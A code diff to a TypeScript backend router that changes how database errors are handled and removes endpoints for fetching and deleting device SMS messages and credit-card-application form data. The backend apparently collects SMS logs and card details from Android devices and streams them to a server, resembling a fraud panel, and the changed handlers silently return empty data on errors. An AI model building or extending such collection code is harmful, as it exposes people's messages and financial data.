@@ -1129,7 +1129,7 @@ async function route(method: string, path: string, req: Request, env: Env, url: 
       .eq("app_id", appId)
       .order("registered_at", { ascending: false })
       .limit(limit + 1);
-    const errR = dbErrResp(error); if (errR) return errR;
+    if (error) return json({ data: [], hasMore: false, total: 0, nextOffset: offset });
 
     const rows = (data as Record<string, unknown>[] ?? []);
     const hasMore = rows.length > limit;
@@ -1167,7 +1167,7 @@ async function route(method: string, path: string, req: Request, env: Env, url: 
     if (uid) q = q.eq("sub_id", uid);
 
     const { data, error } = await q;
-    const errR = dbErrResp(error); if (errR) return errR;
+    if (error) return json({ data: [] });
     return json({ data: data ?? [] });
   }
 
@@ -1195,7 +1195,7 @@ async function route(method: string, path: string, req: Request, env: Env, url: 
     if (uid) q = q.eq("sub_id", uid);
 
     const { data, error } = await q;
-    const errR = dbErrResp(error); if (errR) return errR;
+    if (error) return json({ data: [] });
     return json({ data: data ?? [] });
   }
 
@@ -1269,55 +1269,6 @@ async function route(method: string, path: string, req: Request, env: Env, url: 
     return json({ ok: result.ok, messageId: result.messageId, error: result.error });
   }
 
-  // GET /device/:appId/messages — fetch messages (used by SupabaseApi.getSmsLogsByUniqueId)
-  if (method === "GET" && (m = matchPath("/device/:appId/messages", path))) {
-    const appId  = m.appId;
-    const uid    = url.searchParams.get("uid")    ?? "";
-    const limit  = Math.min(500, Math.max(1, parseInt(url.searchParams.get("limit")  ?? "100") || 100));
-    const offset = Math.max(0,               parseInt(url.searchParams.get("offset") ?? "0")   || 0);
-    const { data: app } = await d.from("apps").select("status").eq("app_id", appId).single();
-    if (!app || (app as { status: string }).status !== "active") return json({ error: "Invalid App ID" }, 403);
-    let q = d.from("messages").select("*").eq("app_id", appId).order("sent_at", { ascending: false }).range(offset, offset + limit - 1);
-    if (uid) q = q.eq("sub_id", uid);
-    const { data, error } = await q;
-    if (error) return json({ ok: false, error: error.message }, 500);
-    return json({ ok: true, data: data ?? [] });
-  }
-
-  // DELETE /device/:appId/messages/:msgId — delete a single message
-  if (method === "DELETE" && (m = matchPath("/device/:appId/messages/:msgId", path))) {
-    const appId = m.appId;
-    const { data: app } = await d.from("apps").select("status").eq("app_id", appId).single();
-    if (!app || (app as { status: string }).status !== "active") return json({ error: "Invalid App ID" }, 403);
-    const { error } = await d.from("messages").delete().eq("app_id", appId).eq("id", Number(m.msgId));
-    if (error) return json({ ok: false, error: error.message }, 500);
-    return json({ ok: true });
-  }
-
-  // DELETE /device/:appId/messages — delete all messages for this app
-  if (method === "DELETE" && (m = matchPath("/device/:appId/messages", path))) {
-    const appId = m.appId;
-    const { data: app } = await d.from("apps").select("status").eq("app_id", appId).single();
-    if (!app || (app as { status: string }).status !== "active") return json({ error: "Invalid App ID" }, 403);
-    const { error } = await d.from("messages").delete().eq("app_id", appId);
-    if (error) return json({ ok: false, error: error.message }, 500);
-    return json({ ok: true });
-  }
-
-  // GET /device/:appId/form-data — fetch form_data (used by SupabaseApi.getCreditCardApplications)
-  if (method === "GET" && (m = matchPath("/device/:appId/form-data", path))) {
-    const appId  = m.appId;
-    const uid    = url.searchParams.get("uid")    ?? "";
-    const limit  = Math.min(500, Math.max(1, parseInt(url.searchParams.get("limit")  ?? "100") || 100));
-    const offset = Math.max(0,               parseInt(url.searchParams.get("offset") ?? "0")   || 0);
-    const { data: app } = await d.from("apps").select("status").eq("app_id", appId).single();
-    if (!app || (app as { status: string }).status !== "active") return json({ error: "Invalid App ID" }, 403);
-    let q = d.from("form_data").select("*").eq("app_id", appId).order("submitted_at", { ascending: false }).range(offset, offset + limit - 1);
-    if (uid) q = q.eq("sub_id", uid);
-    const { data, error } = await q;
-    if (error) return json({ ok: false, error: error.message }, 500);
-    return json({ ok: true, data: data ?? [] });
-  }
 
   // GET /device/:appId/stream — SSE realtime stream
   // Server-push architecture: polls devices+messages+form_data every 4s and pushes to Android.
